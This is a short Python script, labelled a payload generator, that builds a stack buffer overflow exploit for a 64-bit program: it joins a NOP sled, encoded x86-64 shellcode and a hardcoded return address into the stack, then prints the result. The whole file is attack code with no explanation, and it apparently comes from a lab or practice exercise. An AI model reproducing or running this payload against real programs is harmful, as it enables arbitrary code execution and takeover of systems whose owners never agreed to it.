#!/usr/bin/python
# Payload generator

base_pointer_length = 8
total_stack_size = 400

shell_code =  ""
shell_code += "\x48\x31\xc9\x48\x81\xe9\xf9\xff\xff\xff\x48\x8d\x05"
shell_code += "\xef\xff\xff\xff\x48\xbb\x54\x08\x60\x97\x24\xa3\xa6"
shell_code += "\xec\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
shell_code += "\x3e\x33\x38\x0e\x6c\x18\x89\x8e\x3d\x66\x4f\xe4\x4c"
shell_code += "\xa3\xf5\xa4\xdd\xef\x08\xba\x47\xa3\xa6\xa4\xdd\xee"
shell_code += "\x32\x7f\x2d\xa3\xa6\xec\x26\x65\x40\xf3\x51\xce\xcb"
shell_code += "\x95\x54\x5e\x37\xdf\xad\x45\xa9\xe9\x1c\x39\x9f\xfd"
shell_code += "\x18\xfb\xa9\xe9"

shell_code_length = len(shell_code);

NOP_length_bytes = (total_stack_size + base_pointer_length) - shell_code_length
NOP = "\x90" * NOP_length_bytes

# Middle of the NOPs
return_address = "\x50\xdc\xff\xff\xff\x7f\x00\x00"
# 0x 00 00 7f ff ff ff d7 c0
return_address = "\x80\xd7\xff\xff\xff\x7f\x00\x00"
print(NOP + shell_code + return_address)
